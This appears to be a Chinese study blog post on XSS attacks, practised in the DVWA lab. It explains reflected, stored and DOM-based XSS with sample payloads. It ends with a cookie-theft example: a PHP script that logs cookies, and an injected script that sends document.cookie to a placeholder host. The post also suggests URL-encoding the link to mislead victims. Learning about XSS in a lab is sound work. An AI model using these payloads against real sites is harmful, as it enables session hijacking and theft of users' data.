---
title: XSS攻击
tags:
  - XSS
categories: 网络安全知识学习
abbrlink: 4fa736d8
date: 2020-11-09 14:14:37
---

　　通过DVWA学习这个挺好<!--more-->

# XSS攻击概述

　　XSS攻击又叫CSS（Cross Site Script），恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。

　　它和SQL注入攻击相似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而XSS攻击是通过插入恶意脚本，实现对用户浏览器的控制，获取用户信息。

![sUIOVe.md.png](https://s3.ax1x.com/2021/01/14/sUIOVe.md.png)

# XSS危害

* 挂马

- 盗取用户Cookie。
- DOS（拒绝服务）客户端浏览器。
- 钓鱼攻击，高级的钓鱼技巧。
- 删除目标文章、恶意篡改数据、嫁祸。
- 劫持用户Web行为，甚至进一步渗透内网。
- 爆发Web2.0蠕虫。
- 蠕虫式的DDoS攻击。
- 蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据等。

# XSS原理

例如：

```php
<?php
    echo $_GET["uname"],
?>
```

当用户访问`url?uname=<script>alert("hello");</script>`时，触发代码，弹出对话框。

## 1.反射型

攻击者通过邮件等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞。

只会执行一次，重复利用。

DVWA反射

`<script>alert(document.cookie);</script>`

## 2.存储型

攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。

DVWA存储型

攻击者在论坛、博客、留言板中、发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。用户正常访问，触发XSS代码。

## 3.DOMXSS

全称Document Object Model

不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。

不经过后端。这种类型是利用非法输入来闭合对应的html标签。如，a标签：`<a href=='$var'></a>`，当$var内容变为`’ οnclick=’alert(/xss/) //`这段代码就会被执行。

# 反射型XSS实例

Cookie在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式，保存在用户浏览器上（客户端）的小文本文件，包含有关用户信息。最典型的应用就是判定用户是否已经登录网站，用户可能会得到提示：是否下一次进入网站时保留用户信息以便简化登录手续。

DVWA

使用以下脚本文件

cookie.php

```php
<?php
    $cookie=$_GET('cookie');
file_put_contents('cookie.txt',$cookie);
?>
```

注入

`url?uname=<script>document.location='http://ip/xss_test/cookie/cookie.php?cookie='+document.cookie;</script>`

将链接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。



